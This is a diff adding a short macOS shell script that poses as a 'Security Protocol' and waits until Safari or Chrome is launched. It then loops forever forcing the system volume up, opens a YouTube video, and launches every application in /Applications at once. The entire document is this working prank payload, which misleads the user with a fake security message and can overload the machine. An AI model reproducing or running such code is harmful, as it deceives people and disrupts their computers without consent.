@@ -1,0 +1,20 @@
+# Check For Safari or Chrome 
+echo "Security Protocol is running.  Do not quit Terminal" 
+i=true 
+while $i 
+do 
+        pgrep -x Safari && i=False 
+        pgrep -x "Google Chrome" && i=False 
+done 
+ 
+# If activated wait 
+sleep 15 
+ 
+# Activate  
+while true 
+do 
+        osascript -e "set Volume 5" 
+done & 
+ 
+open https://www.youtube.com/watch?v=U06jlgpMtQs 
+open /Applications/*  
